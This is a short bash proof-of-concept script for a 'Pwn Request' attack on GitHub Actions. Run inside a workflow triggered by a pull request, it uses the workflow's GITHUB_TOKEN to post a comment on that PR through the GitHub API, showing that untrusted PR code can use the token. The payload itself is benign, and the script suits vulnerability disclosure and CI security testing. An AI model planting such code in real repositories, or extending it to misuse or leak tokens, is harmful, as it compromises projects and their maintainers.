#!/bin/bash

echo "Running Pwn Request PoC"

PR_NUMBER=$(echo "$GITHUB_REF" | cut -d'/' -f3)

echo "PR Number: $PR_NUMBER"

curl -s -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/comments \
  -d "{\"body\":\"✅ Pwn Request PoC: Token usable inside workflow\"}"
